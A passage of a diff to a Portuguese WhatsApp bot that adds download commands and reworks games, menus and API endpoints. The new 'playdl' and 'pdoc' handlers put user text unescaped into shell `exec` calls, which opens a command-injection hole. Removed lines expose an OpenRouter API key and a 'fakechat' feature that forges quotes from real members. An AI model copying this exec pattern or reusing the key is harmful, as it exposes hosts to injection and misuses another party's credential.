-quotedMsg?.videoMessage ||
-quotedMsg?.viewOnceMessageV2?.message?.videoMessage ||
-quotedMsg?.viewOnceMessage?.message?.videoMessage;
-
-if (vidMsg) {
-if ((vidMsg.seconds || 0) > 30) {
-await reagir(from, "❌");
-return reply("❌ O vídeo deve ter no máximo 30 segundos.");
-}
-
-const buff = await getFileBuffer(vidMsg, 'video');
-const link = await uploadTelegraph(buff, 'video.mp4', 'video/mp4');
-
-await conn.sendMessage(from, {
-text: `🎥 *LINK GERADO:*\n${link}`
-}, { quoted: selo });
-
-await reagir(from, "✅");
-break;
-}
-
-const audMsg =
-quotedMsg?.audioMessage ||
-quotedMsg?.viewOnceMessageV2?.message?.audioMessage ||
-quotedMsg?.viewOnceMessage?.message?.audioMessage;
-
-if (audMsg) {
-const buff = await getFileBuffer(audMsg, 'audio');
-const link = await uploadTmpFiles(buff, 'audio.mp3', 'audio/mpeg');
-
-await conn.sendMessage(from, {
-text: `🎧 *LINK GERADO:*\n${link}`
-}, { quoted: selo });
-
-await reagir(from, "✅");
-break;
-}
-
-await reagir(from, "❌");
-reply("❌ Responda uma imagem, vídeo ou áudio.");
 
 } catch (e) {
-console.error('[GERARLINK ERROR]', e?.response?.data || e);
-await reagir(from, "❌");
-reply(`❌ Erro ao gerar link.\n\n${e.message || e}`);
+    console.error("[GERARLINK ERROR]", e?.response?.data || e);
+    await reagir(from, "❌");
+    reply(`❌ Erro ao gerar link.\n\n${e.message || e}`);
 }
 }
 break;
@@ -3726,25 +13264,45 @@ break;
 case 'bemvindo':
 case 'welcome': {
   if (!isGroup) return reply(msg.SoEmGrupo);
-  if (!isGroupAdmins && !So_Dono) return reply(msg.SoAdmin);
-  if (!isBotGroupAdmins) return reply(msg.BotAdmin);
-  if (args.length < 1) return reply('1 pra ligar / 0 pra desligar');
+  if (!So_Admins && !So_Dono) return reply(msg.SoAdmin);
 
-  if (Number(args[0]) === 1) {
+  const metadata = await conn.groupMetadata(from)
+  const botId = conn.user.id.split(":")[0] + "@s.whatsapp.net"
+
+  const isBotAdmin = metadata.participants.some(
+    p => p.id === botId && p.admin
+  )
+
+  if (!isBotAdmin) return reply(msg.BotAdmin);
+
+  if (!args[0]) return reply('1 pra ligar / 0 pra desligar');
+
+  const status = Number(args[0]);
+
+  if (status === 1) {
     if (isBemvindo) return reply('Já está ativo');
+
+    if (!dataGp[0].wellcome) dataGp[0].wellcome = [{}];
+    if (!dataGp[0].wellcome[0]) dataGp[0].wellcome[0] = {};
+
     dataGp[0].wellcome[0].bemvindo1 = true;
     setGp(dataGp);
-    reply(MSG.Ativado);
 
-  } else if (Number(args[0]) === 0) {
+    return reply(MSG.Ativado);
+
+  } else if (status === 0) {
     if (!isBemvindo) return reply('Já está desativado');
+
+    if (!dataGp[0].wellcome) dataGp[0].wellcome = [{}];
+    if (!dataGp[0].wellcome[0]) dataGp[0].wellcome[0] = {};
+
     dataGp[0].wellcome[0].bemvindo1 = false;
     setGp(dataGp);
-    reply(MSG.Desativado);
 
-  } else {
-    reply('1 para ativar, 0 para desativar');
+    return reply(MSG.Desativado);
   }
+
+  return reply('1 para ativar, 0 para desativar');
 }
 break;
 
@@ -3885,14 +13443,14 @@ buttons: [
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: "🎵 Baixar Áudio",
-id: `${prefix}playdl ${video.url}`
+id: `${prefix}playdl ${video.videoId}`
 })
 },
 {
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: "🎬 Baixar Doc",
-id: `${prefix}pdoc ${video.url}`
+id: `${prefix}pdoc ${video.videoId}`
 })
 },
 {
@@ -3928,9 +13486,116 @@ reply('❌ Erro ao executar comando.');
 }
 break;
 
+case 'playdl': {
+try {
+if (!q) return reply("❌ Envie o link");
+
+await reagir(from, "🎧");
+
+const pasta = "./temp";
+if (!fs.existsSync(pasta)) fs.mkdirSync(pasta);
+
+const file = `audio_${Date.now()}.mp3`;
+const output = path.join(pasta, file);
+
+// 🔥 yt-dlp direto (sem ytdl-core)
+const cmd = `yt-dlp -x --audio-format mp3 -o "${output}" "${q}"`;
+
+exec(cmd, async (err) => {
+try {
+
+if (err) {
+console.log(err);
+return reply("❌ Erro ao baixar áudio");
+}
+
+if (!fs.existsSync(output)) {
+return reply("❌ arquivo não gerado");
+}
+
+await conn.sendMessage(from, {
+audio: fs.readFileSync(output),
+mimetype: "audio/mpeg",
+fileName: file
+}, { quoted: selo });
+
+fs.unlinkSync(output);
+
+} catch (e) {
+console.log(e);
+reply("❌ erro ao enviar áudio");
+}
+});
+
+} catch (e) {
+console.log(e);
+reply("❌ erro no playdl");
+}
+}
+break;
+
+case 'pdoc': {
+try {
+if (!q) return reply(`🎥 Use:\n${prefix + command} link_do_video`);
+
+if (!q.startsWith('http')) {
+return reply('❌ Envie uma URL válida.');
+}
+
+await reagir(from, '⏳');
+
+const { exec } = require('child_process');
+
+const pasta = './temp';
+if (!fs.existsSync(pasta)) fs.mkdirSync(pasta);
+
+const nome = `video_${Date.now()}.mp4`;
+const saida = path.join(pasta, nome);
+
+// 🔥 comando mais estável do yt-dlp
+const cmd = `yt-dlp -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/mp4/best" -o "${saida}" "${q}"`;
+
+exec(cmd, async (erro, stdout, stderr) => {
+try {
+
+if (erro) {
+console.log(stderr || erro);
+await reagir(from, '❌');
+return reply('❌ Falha ao baixar vídeo. Link pode não ser suportado ou yt-dlp desatualizado.');
+}
+
+if (!fs.existsSync(saida)) {
+await reagir(from, '❌');
+return reply('❌ Arquivo não foi gerado pelo yt-dlp.');
+}
+
+await conn.sendMessage(from, {
+video: fs.readFileSync(saida),
+mimetype: 'video/mp4',
+caption: `✅ *Vídeo baixado com sucesso!*`
+}, { quoted: selo });
+
+fs.unlinkSync(saida);
+await reagir(from, '✅');
+
+} catch (e) {
+console.log(e);
+reply('❌ Erro ao enviar vídeo.');
+}
+});
+
+} catch (e) {
+console.log(e);
+reply('❌ Erro no comando pdoc.');
+}
+}
+break;
+
 case 'menu': {
 try {
 await reagir(from, "❤️‍🔥");
+
+console.log("ENTROU NA CASE MENU");
 
 // SOCKET
 const sock = global.sock || conn || client || this;
@@ -3978,8 +13643,8 @@ const listaMenus = {
           id: prefix + "menudown"
         },
         {
-          header: "🔎 𝑷𝑬𝑺𝑸𝑼𝑰𝑺𝑨",
-          title: "❤️‍🔥 𝑴𝒆𝒏𝒖 𝑷𝒆𝒔𝒒𝒖𝒊𝒔𝒂",
+          header: "🔎 𝑼𝑻𝑬𝑰𝑺",
+          title: "❤️‍🔥 𝑴𝒆𝒏𝒖 𝑼𝒕𝒆𝒊𝒔",
           description: "⟡ Google, IA, consultas e buscas online",
           id: prefix + "menupesquisa"
         },
@@ -4002,8 +13667,9 @@ const listaMenus = {
           id: prefix + "menuadm"
         },
         {
-        title: '💎 PAINEL VIP',
-        description: 'Comandos exclusivos para usuários VIP',
+        header: "💎 𝑽𝑰𝑷",
+        title: '💎 𝑷𝒂𝒊𝒏𝒆𝒍 𝑽𝒊𝒑',
+        description: '⟡ Comandos exclusivos para usuários VIP',
         id: `${prefix}menuvip`
         },
         {
@@ -4105,8 +13771,8 @@ const textok = `
 
 💀 Eae, criatura.
 
-📡 Eu tava de boa até você aparecer.
-⚡ Mas já que tá aqui, escolhe logo o que quer.
+📡 Sou diferente da tua Ex, eu não te
+   abandono quando precisa.
 
 ╭━━━━━━━━━━━━━━━⬣
 ┃ 🧠 Sistema: Online
@@ -4115,7 +13781,7 @@ const textok = `
 ┃ 🔥 Vontade de responder: ${vontadeRandom}
 ╰━━━━━━━━━━━━━━━⬣
 
-📂 Escolhe um menu aí
+📂 Escolhe um menu aí bb
 
 > Desenvolvido por GzeeScriptsDev</>
 `;
@@ -4178,7 +13844,7 @@ break;
 
 case 'vip':
 case 'menuvip': {
-if (!isVip && !isDono)
+if (!isVip && !So_Dono)
 return reply('💎 Apenas usuários VIP podem acessar este menu.');
 
 await conn.sendMessage(from, {
@@ -4524,120 +14190,6 @@ mentions: [sender]
 break;
 
 //COMANDO RPG
-
-case 'raid': {
-try {
-if (!isGroup) return reply('❌ Esse comando só funciona em grupo.');
-
-const groupMetadata = await conn.groupMetadata(from);
-const groupMembers = groupMetadata.participants;
-
-const participantes = groupMembers
-.map(m => m.id || m.jid)
-.filter(id => id && !id.includes(conn.user.id.split(':')[0]));
-
-if (participantes.length < 2) {
-return reply('❌ Precisa ter pelo menos 2 membros no grupo pra iniciar uma raid.');
-}
-
-if (!global.banco) global.banco = {};
-
-const bosses = [
-{ nome: '🐉 Dragão Ancestral', vida: 5000, poder: 90, premio: 3500, xp: 450 },
-{ nome: '👹 Demônio Infernal', vida: 7000, poder: 120, premio: 5000, xp: 650 },
-{ nome: '🧟 Rei Zumbi', vida: 4000, poder: 70, premio: 2500, xp: 350 },
-{ nome: '🦇 Vampiro Sombrio', vida: 4500, poder: 85, premio: 3000, xp: 400 },
-{ nome: '💀 Caveira Titã', vida: 6000, poder: 110, premio: 4500, xp: 550 }
-];
-
-const boss = bosses[Math.floor(Math.random() * bosses.length)];
-
-let poderGrupo = 0;
-
-for (const jid of participantes) {
-const id = jid.replace(/\D/g, '');
-
-if (!global.banco[id]) {
-global.banco[id] = {
-saldo: 0,
-xp: 0,
-nivel: 1,
-vitorias: 0,
-derrotas: 0,
-inventario: {}
-};
-}
-
-const nivel = global.banco[id].nivel || 1;
-poderGrupo += Math.floor(Math.random() * 80) + nivel * 10;
-}
-
-const venceu = poderGrupo > boss.vida / 10 + boss.poder;
-
-let texto = `╔═━───────━━▒۞▒━━───────━═╗
-┃ 🐉🌌 𝐑𝐀𝐈𝐃 𝐑𝐏𝐆 🌌🐉
-├━━━━━━━━━━━━━━━━━━━━
-┃ 👹 Boss: ${boss.nome}
-┃ ❤️ Vida: ${boss.vida}
-┃ ⚡ Poder Boss: ${boss.poder}
-┃ 👥 Participantes: ${participantes.length}
-┃ ⚔️ Poder do grupo: ${poderGrupo}
-├━━━━━━━━━━━━━━━━━━━━
-`;
-
-if (venceu) {
-texto += `┃ ✅ Resultado: VITÓRIA!
-┃
-┃ 🎁 Recompensa por jogador:
-┃ 💰 R$${boss.premio}
-┃ ⭐ XP +${boss.xp}
-├━━━━━━━━━━━━━━━━━━━━
-`;
-
-for (const jid of participantes) {
-const id = jid.replace(/\D/g, '');
-
-global.banco[id].saldo += boss.premio;
-global.banco[id].xp += boss.xp;
-global.banco[id].vitorias++;
-
-const novoNivel = Math.floor(global.banco[id].xp / 1000) + 1;
-if (novoNivel > global.banco[id].nivel) {
-global.banco[id].nivel = novoNivel;
-}
-}
-
-} else {
-texto += `┃ ❌ Resultado: DERROTA!
-┃
-┃ ☠️ O grupo foi destruído pelo boss.
-┃ ⭐ XP de consolação: +50
-├━━━━━━━━━━━━━━━━━━━━
-`;
-
-for (const jid of participantes) {
-const id = jid.replace(/\D/g, '');
-
-global.banco[id].xp += 50;
-global.banco[id].derrotas++;
-}
-}
-
-texto += `┃ 👥 Guerreiros:
-${participantes.map(jid => `┃ ⟡ @${jid.split('@')[0]}`).join('\n')}
-╚═━───────━━▒۞▒━━───────━═╝`;
-
-await conn.sendMessage(from, {
-text: texto,
-mentions: participantes
-}, { quoted: selo });
-
-} catch (e) {
-console.error(e);
-reply('❌ Erro ao iniciar raid.');
-}
-}
-break;
 
 case 'duelo': {
 try {
@@ -5086,50 +14638,64 @@ break;
 case 'topmoney':
 case 'rankmoney':
 case 'ricos': {
+try {
 
-let users = Object.entries(global.db.data.users || {})
-.filter(([_, user]) => user.money)
-.sort((a, b) => (b[1].money || 0) - (a[1].money || 0))
-.slice(0, 10);
+if (!isGroup) return reply('❌ Este comando só pode ser usado em grupos.');
 
-if (!users.length) return reply('Ninguém possui dinheiro ainda.');
+const banco = JSON.parse(fs.readFileSync('./database/banco.json', 'utf8'));
+const metadata = await conn.groupMetadata(from);
 
-let texto = `╭━━〔 🏆 TOP MONEY 〕━━⬣\n\n`;
+let users = Object.entries(banco)
+.filter(([_, user]) => Number(user.saldo || 0) > 0)
+.sort((a, b) => Number(b[1].saldo || 0) - Number(a[1].saldo || 0))
+.slice(0, 5);
+
+if (!users.length) return reply('❌ Nenhum participante do grupo possui dinheiro.');
+
+let texto = `╭━━〔 🏆 TOP 5 RICOS 〕━━⬣\n\n`;
 
 for (let i = 0; i < users.length; i++) {
 const [jid, user] = users[i];
 
-let nome;
-try {
-nome = await conn.getName(jid);
-} catch {
-nome = jid.split('@')[0];
+let nome = jid.split('@')[0];
+
+const participante = metadata.participants.find(p => p.id === jid);
+
+if (participante) {
+nome =
+participante.notify ||
+participante.name ||
+(await conn.getName(jid)) ||
+jid.split('@')[0];
 }
 
 const medalha =
 i === 0 ? '🥇' :
 i === 1 ? '🥈' :
-i === 2 ? '🥉' : '💰';
+i === 2 ? '🥉' :
+i === 3 ? '🏅' :
+'🎖️';
 
 texto += `${medalha} ${i + 1}° ${nome}\n`;
-texto += `💵 R$${(user.money || 0).toLocaleString('pt-BR')}\n\n`;
+texto += `💰 R$ ${Number(user.saldo || 0).toLocaleString('pt-BR')}\n\n`;
 }
 
-texto += `╰━━━━━━━━━━━━━━⬣`;
+texto += '╰━━━━━━━━━━━━━━⬣';
 
-const gifs = [
+const imagens = [
 './midias/top1.jpeg',
 './midias/top2.jpeg'
 ];
 
-const gifAleatorio = gifs[Math.floor(Math.random() * gifs.length)];
-
 await conn.sendMessage(from, {
-video: fs.readFileSync(gifAleatorio),
-gifPlayback: true,
+image: fs.readFileSync(imagens[Math.floor(Math.random() * imagens.length)]),
 caption: texto
 }, { quoted: selo });
 
+} catch (err) {
+console.error(err);
+reply('❌ Erro ao gerar o ranking.');
+}
 }
 break;
 
@@ -5155,11 +14721,27 @@ if (Date.now() - user.lastAssalto < cooldown) {
 return reply(`⏳ Aguarde ${formatarTempo(cooldown - (Date.now() - user.lastAssalto))}`);
 }
 
-const ctx = info.message?.extendedTextMessage?.contextInfo || {};
-const mentionedJid = ctx.mentionedJid || [];
-const alvo = mentionedJid[0] || ctx.participant || null;
+const alvo = jidNormalizedUser(sender_ou_n);
 
-if (!alvo) return reply(`Marque alguém.\nEx: ${prefix}assaltar @usuario`);
+if (!alvo) {
+    return reply('Marque ou responda a mensagem de alguém.');
+}
+
+if (alvo === sender) {
+    return reply('❌ Você não pode se assaltar.');
+}
+
+if (!alvo) {
+    return reply(`Marque ou responda a mensagem de alguém.`);
+}
+
+console.log({
+    sender,
+    alvo,
+    menc_jid,
+    marc_tds,
+    menc_prt
+});
 
 if (alvo === sender) return reply(`❌ Você não pode se assaltar.`);
 
@@ -5241,7 +14823,7 @@ break;
 case 'work':
 case 'trabalhar': {
 try {
-const cooldown = 3600000;
+const cooldown = 900000;
 
 const db = carregarBanco();
 const userId = getUserBancoId(info, sender, isGroup);
@@ -5394,9 +14976,17 @@ if (!q) return reply(`Use: ${prefix}emprego número\nExemplo: ${prefix}emprego 1
 const id = Number(q);
 const emprego = empregos.find(e => e.id === id);
 
-if (!emprego) return reply(`Emprego inválido. Use ${prefix}empregos`);
+if (!emprego) return reply(`❌ Emprego inválido. Use ${prefix}empregos`);
 
 const xpUser = Number(user.xp || 0);
+
+// Apenas o dono do bot pode pegar empregos exclusivos
+if (emprego.dono && !isOwner) {
+return reply(`❌ Esse emprego é exclusivo do dono da Zyron.
+
+💼 Cargo: ${emprego.nome}
+👑 Apenas o criador da Zyron pode possuir esse cargo.`);
+}
 
 if (xpUser < emprego.xp) {
 return reply(`❌ Você não tem XP suficiente.
@@ -5416,7 +15006,7 @@ return reply(`╭━━〔 💼 EMPREGO DEFINIDO 〕━━⬣
 ┃
 ┃ 👨‍💼 Cargo: ${emprego.nome}
 ┃ 💰 Salário: R$${emprego.min} - R$${emprego.max}
-┃ ⭐ XP Necessário: ${emprego.xp}
+┃ ⭐ XP Necessário: ${emprego.xp === Infinity ? "∞" : emprego.xp}
 ┃ ⭐ Seu XP: ${xpUser}
 ┃
 ┃ Use ${prefix}work para trabalhar.
@@ -6140,7 +15730,7 @@ contentType: 'image/jpeg'
 form.append('prompt', q);
 
 const { data } = await axios.post(
-'https://systemzone.store/api/v2/edit/deepai',
+'https://zone.api.br/api/v2/edit/deepai',
 form,
 {
 headers: {
@@ -6216,7 +15806,7 @@ form.append('prompt', prompt);
 form.append('output_format', 'png');
 
 const { data } = await axios.post(
-'https://systemzone.store/api/v2/nanolite?apikey=freekey',
+'https://zone.api.br/api/v2/nanolite?apikey=freekey',
 form,
 {
 headers: form.getHeaders(),
@@ -6279,7 +15869,7 @@ content: q
 },
 {
 headers: {
-Authorization: 'Bearer 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',
+Authorization: 'Bearer API_KEY_ROUTER',
 'Content-Type': 'application/json'
 }
 }
@@ -6450,7 +16040,7 @@ break;
 
 case 'modelosimg': {
 try {
-const OPENROUTER_KEY = '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';
+const OPENROUTER_KEY = 'API_KEY_ROUTER';
 
 const res = await axios.get('https://openrouter.ai/api/v1/models', {
 headers: {
@@ -6482,7 +16072,7 @@ const res = await axios.get(
 'https://openrouter.ai/api/v1/models',
 {
 headers: {
-Authorization: `Bearer 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`
+Authorization: `Bearer API_KEY_ROUTER`
 }
 }
 );
@@ -6574,7 +16164,7 @@ case 'caraoucoroa': {
 try {
 await conn.sendMessage(from, { react: { text: '🪙', key: info.key } });
 
-const { data } = await axios.get('https://systemzone.store/api/canvas/moeda');
+const { data } = await axios.get('https://zone.api.br/api/canvas/moeda');
 
 if (!data?.status || !data?.result?.download) {
 throw new Error('API falhou');
@@ -6599,7 +16189,7 @@ if (!q) return reply(`Exemplo: ${prefix + command} Mine/mine2/mine3`);
 
 const [t1, t2, t3] = q.split('/');
 
-const api = `https://systemzone.store/api/v1/canvas/minecrafttext?text=${encodeURIComponent(t1 || '')}&text2=${encodeURIComponent(t2 || '')}&text3=${encodeURIComponent(t3 || '')}`;
+const api = `https://zone.api.br/api/v1/canvas/minecrafttext?text=${encodeURIComponent(t1 || '')}&text2=${encodeURIComponent(t2 || '')}&text3=${encodeURIComponent(t3 || '')}`;
 
 const { data } = await axios.get(api);
 
@@ -7074,51 +16664,64 @@ reply(`Erro ao buscar resultados\n\n${e.message}`);
 break;
 
 //DOWNLOADS
-case 'playdl': {
+case 'play': {
 try {
+
+const yts = require('yt-search')
+const ytdl = require('@distube/ytdl-core')
+
 if (!q?.trim()) {
-return reply(`🎧 *Exemplo de uso:*
-${prefix + command} link ou nome da música`);
+return reply(`🎧 Exemplo:
+${prefix + command} nome da música`);
 }
 
 await reagir(from, "⏳");
 
-const { data: res } = await axios.get(`${sysite}/v2/player`, {
-params: {
-text: q.trim(),
-apikey: syskey
-},
-timeout: 30000,
-validateStatus: () => true
-});
+const search = await yts(q)
 
-if (!res?.status || !res?.download_url) {
-await reagir(from, "❌");
-return reply("❌ Não consegui baixar essa música.");
+if (!search?.videos?.length) {
+await reagir(from, "❌")
+return reply("❌ Nenhum resultado encontrado.")
 }
 
+const video = search.videos[0]
+const url = video.url
+
+if (!ytdl.validateURL(url)) {
+await reagir(from, "❌")
+return reply("❌ Vídeo inválido.")
+}
+
+// 🔥 MELHOR FORMA (SEM BUFFER ESTOURAR)
+const stream = ytdl(url, {
+filter: 'audioonly',
+quality: 'highestaudio',
+highWaterMark: 1 << 25
+})
+
 await conn.sendMessage(from, {
-audio: { url: res.download_url.replace(/^http:\/\//i, "https://") },
+audio: stream,
 mimetype: "audio/mpeg",
-fileName: `${res.title || "Zyron-MD"}.mp3`,
+fileName: `${video.title}.mp3`,
 ptt: false,
 contextInfo: {
 externalAdReply: {
-title: res.title || "YouTube Downloader",
-body: "Zyron-MD • Download concluído",
-thumbnailUrl: res.thumbnail || res.thumb || "",
+title: video.title || "YouTube Audio",
+body: "Zyron-MD • Play",
+thumbnailUrl: video.thumbnail || "",
 mediaType: 1,
-renderLargerThumbnail: true
+renderLargerThumbnail: true,
+sourceUrl: url
 }
 }
-}, { quoted: selo || info });
+}, { quoted: info })
 
 await reagir(from, "✅");
 
 } catch (e) {
-console.log("ERRO PLAYDL:", e?.response?.data || e);
+console.log("ERRO PLAY:", e);
 await reagir(from, "❌");
-reply("❌ Erro ao processar download do YouTube.");
+reply("❌ Erro ao tocar música.");
 }
 }
 break;
@@ -7387,7 +16990,6 @@ case 'shazam':
 case 'reconhecermusica': {
 try {
     const FormData = require('form-data');
-    const { prepareWAMessageMedia, generateWAMessageFromContent } = require('@systemzero/baileys');
 
     const texto = q || args.join(' ') || '';
     const quoted = m.quoted ? m.quoted : null;
@@ -7403,7 +17005,7 @@ try {
 ╰━━━━━━━━━━━━━━⬣`);
     }
 
-    await systemZR.sendMessage(from, {
+    await conn.sendMessage(from, {
         react: { text: '⏳', key: m.key }
     });
 
@@ -7431,13 +17033,13 @@ try {
     }
 
     const { data } = await axios.post(
-        'https://systemzone.store/api/shazam?apikey=freekey',
-        payload,
-        {
-            headers,
-            timeout: 60000
-        }
-    );
+    'https://zone.api.br/api/shazam?apikey=API_KEY_SYSTEM',
+    payload,
+    {
+        headers,
+        timeout: 60000
+    }
+);
 
     if (!data?.status || !data?.identified || !data?.result) {
         throw new Error('Música não identificada.');
@@ -7512,7 +17114,7 @@ try {
     if (r.media?.image) {
         const media = await prepareWAMessageMedia(
             { image: { url: r.media.image } },
-            { upload: systemZR.waUploadToServer }
+            { upload: conn.waUploadToServer }
         );
 
         header = {
@@ -7539,12 +17141,12 @@ try {
             quoted: m
         });
 
-        await systemZR.relayMessage(from, msg.message, {
+        await conn.relayMessage(from, msg.message, {
             messageId: msg.key.id
         });
     } else {
         if (r.media?.image) {
-            await systemZR.sendMessage(from, {
+            await conn.sendMessage(from, {
                 image: { url: r.media.image },
                 caption: txt
             }, { quoted: m });
@@ -7554,21 +17156,21 @@ try {
     }
 
     if (r.media?.preview) {
-        await systemZR.sendMessage(from, {
+        await conn.sendMessage(from, {
             audio: { url: r.media.preview },
             mimetype: 'audio/mpeg',
             ptt: false
         }, { quoted: m });
     }
 
-    await systemZR.sendMessage(from, {
+    await conn.sendMessage(from, {
         react: { text: '✅', key: m.key }
     });
 
 } catch (e) {
     console.log('[ERRO SHAZAM]', e?.response?.data || e?.message || e);
 
-    await systemZR.sendMessage(from, {
+    await conn.sendMessage(from, {
         react: { text: '❌', key: m.key }
     });
 
@@ -7733,18 +17335,31 @@ dataGp[0].bangp = false
 setGp(dataGp)
 reply(`Grupo desbanido...`)
 }
-break
+break;
 
-case 'reiniciar': case 'r':{
-if(!So_Dono) return reply(msg.SoDono)
-setTimeout(async () => {
-reply("Reiniciando...")
-setTimeout(async () => {
-process.exit()
-}, 1200)
-}, 1000)
+case 'reiniciar':
+case 'restart':
+case 'r': {
+try {
+if (!So_Dono) return reply(msg.SoDono);
+
+await reagir(from, "🔄");
+
+await reply(`🔄 *Reiniciando o Zyron-MD...*
+
+⏳ Aguarde alguns segundos.`);
+
+// Aguarda 1 segundo para a mensagem ser enviada
+await new Promise(resolve => setTimeout(resolve, 1000));
+
+process.exit(0);
+
+} catch (e) {
+console.log(e);
+reply("❌ Erro ao reiniciar o bot.");
 }
-break
+}
+break;
 
 case 'donos':
 case 'listadonos': {
@@ -7956,7 +17571,7 @@ body: {
 text: "Escolha uma opção abaixo:"
 },
 footer: {
-text: "Zyron-AI ❤️‍🔥"
+text: "Zyron-MD & Zyron-AI ❤️‍🔥"
 },
 nativeFlowMessage: {
 buttons: botoes
@@ -8565,84 +18180,6 @@ case 'name': {
 }
 break;
 
-case 'fakemsg':
-case 'fakechat': {
-  try {
-    if (!q || !q.includes('|')) {
-      return reply(`❌ *Formato incorreto!*\n\n📌 Exemplo:\n${prefix + command} @user|mensagem fake|sua resposta\n\n💡 *Dica:* Se o nome bugar, *responda* uma mensagem da pessoa em vez de usar o @.`);
-    }
-
-    const partes = q.split("|");
-    const tarrget = partes[1]?.trim();
-    const bott = partes[2]?.trim();
-
-    const ctx = info?.message?.extendedTextMessage?.contextInfo;
-    let mentioned = ctx?.mentionedJid?.[0];
-    let repliedParticipant = ctx?.participant;
-    let repliedStanzaId = ctx?.stanzaId;
-
-    let target = mentioned || repliedParticipant;
-    const crypto = require('crypto');
-    let stanzaToUse = "BAE5" + crypto.randomBytes(13).toString('hex').toUpperCase();
-
-    // 🔥 A MÁGICA: Se você respondeu a alguém, usamos o ID real da mensagem!
-    // Isso força o WhatsApp a puxar o nome e a foto corretos, mesmo se o número estiver oculto (LID).
-    if (repliedParticipant && !mentioned) {
-        target = repliedParticipant;
-        stanzaToUse = repliedStanzaId;
-    }
-
-    // Plano B: Extrair número digitado se não houver marcação ou resposta
-    if (!target) {
-      const numMatch = q.match(/@(\d+)/);
-      if (numMatch?.[1]) target = `${numMatch[1]}@s.whatsapp.net`;
-    }
-
-    if (!target || !tarrget || !bott) {
-      return reply(`❌ *Não consegui identificar o alvo!*\n\n⚠️ Marque a pessoa ou *responda* uma mensagem dela.\n\n📌 Exemplo:\n${prefix + command} @user|mensagem|resposta`);
-    }
-
-    // 🔥 TRADUTOR AGRESSIVO: Tenta converter o LID para Número Normal
-    if (target.includes('@lid')) {
-        const membroInfo = MembrosGP.find(m => m.lid === target || m.id === target);
-        // Garante que pegou o número de telefone e não outro código
-        if (membroInfo && membroInfo.id && membroInfo.id.includes('@s.whatsapp.net')) {
-            target = membroInfo.id; 
-        }
-    }
-
-    target = jidNormalizedUser(target);
-
-    // Trava para o bot não executar comandos sozinhos
-    const prefixosBloqueados = [prefix, "-", "/", "#", "+", ".", "!"];
-    if (prefixosBloqueados.some(p => bott.startsWith(p))) {
-      return reply('❌ *Não é permitido fazer o bot enviar comandos no fake chat otario.*');
-    }
-
-    await reagir(from, "🎭");
-
-    // Envio final com o ID cravado
-    await conn.sendMessage(from, {
-      text: bott,
-      contextInfo: {
-        stanzaId: stanzaToUse, // Usa o ID fake, ou o ID real roubado da resposta
-        participant: target,
-        quotedMessage: {
-          conversation: tarrget
-        }
-      }
-    });
-
-    await reagir(from, "✅");
-
-  } catch (e) {
-    console.error(e);
-    await reagir(from, "❌");
-    reply('❌ *Erro ao criar fake chat.*');
-  }
-}
-break;
-
 case 'st':
 case 'stk':
 case 'sticker':
@@ -8652,48 +18189,69 @@ var RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
 var boij2 = RSM?.imageMessage || info.message?.imageMessage || RSM?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage || RSM?.viewOnceMessage?.message?.imageMessage
 var boij = RSM?.videoMessage || info.message?.videoMessage || RSM?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage || RSM?.viewOnceMessage?.message?.videoMessage
 if(boij2){
-var pack = ` ➲ ꜱᴏʟɪᴄɪᴛᴀᴅᴏ ᴩᴏʀ  ➠\n ➲ ɴᴏᴍᴇ ᴅᴏ ʙᴏᴛ ➠\n ➲ ɴɪᴄᴋ ᴅᴏɴᴏ ➠`
+var pack = ` ➤ 𝑺𝒐𝒍𝒊𝒄𝒊𝒕𝒂𝒅𝒐 𝒑𝒐𝒓:\n ➤ 𝑵𝒐𝒎𝒆 𝒅𝒐 𝑩𝒐𝒕:\n ➤ 𝑵𝒊𝒄𝒌 𝒅𝒐 𝑫𝒐𝒏𝒐:`
 var author2 = ` 「 ${pushname} 」 \n「 ${NomeBot} 」\n「 ${NickDono} 」`
 owgi = await getFileBuffer(boij2, 'image')
 let encmediaa = await sendImageAsSticker2(conn, from, owgi, selo, { packname:pack, author:author2})
-await DLT_FL(encmediaa)
 } else if(boij && boij.seconds < 11){
-var pack = `➲ꜱᴏʟɪᴄɪᴛᴀᴅᴏ ᴩᴏʀ➠`
+var pack = `➤ 𝑺𝒐𝒍𝒊𝒄𝒊𝒕𝒂𝒅𝒐 𝒑𝒐𝒓:`
 var author2 = ` ${pushname}`
 owgi = await getFileBuffer(boij, 'video')
 let encmedia = await sendVideoAsSticker2(conn, from, owgi, selo, { packname:pack, author:author2})
-await DLT_FL(encmedia)
 } else {
 return reply(`Marque uma imagem, ou um vídeo de ate 9.9 segundos, ou uma visualização única, para fazer figurinha, com o comando ${prefix+command}`)
 }
 break
 
-case 'bratvid': {
-await conn.sendMessage(from, {react: {text: `🎬`, key: info.key}})
-
-if (!q) return reply(`Exemplo: ${prefix+command} GzeeScriptsDev`)
+case 'brat': {
+if (!q) return reply(`Exemplo: ${prefix+command} Gzee Scripts Dev`)
 
 try {
+const api = await fetch(`https://zone.api.br/api/brat?text=${encodeURIComponent(q)}`)
+const data = await api.json()
 
-var pack = `➲ꜱᴏʟɪᴄɪᴛᴀᴅᴏ ᴩᴏʀ➠`
-var author2 = ` ${pushname}`
+let buffer = await getBuffer(data.imagem)
 
-// sua API
-const url = `http://node3.tedhost.com.br:3027/bratvid?text=${encodeURIComponent(q)}`
-
-// baixa o vídeo
-let buffer = await getBuffer(url)
-
-// envia como figurinha animada
-await sendVideoAsSticker2(conn, from, buffer, selo, {
+await sendImageAsSticker2(conn, from, data.imagem, info, {
 packname: pack,
 author: author2
 })
 
-} catch (e) {
+} catch(e) {
 console.log(e)
-reply('❌ Erro ao gerar bratvid.')
+reply("❌ Erro ao gerar brat")
 }
+}
+break
+
+case 'bratvid': {
+if (!q) return reply(`Exemplo: ${prefix+command} Gzee Scripts Dev`)
+
+try {
+
+const axios = require('axios')
+
+const { data } = await axios.get(
+`https://zone.api.br/api/brat?text=${encodeURIComponent(q)}`,
+{
+timeout: 15000
+}
+)
+
+if (!data.status) return reply("❌ API não respondeu")
+
+let buffer = await getBuffer(data.imagem)
+
+await sendImageAsSticker2(conn, from, data.imagem, info, {
+packname: pack,
+author: author2
+})
+
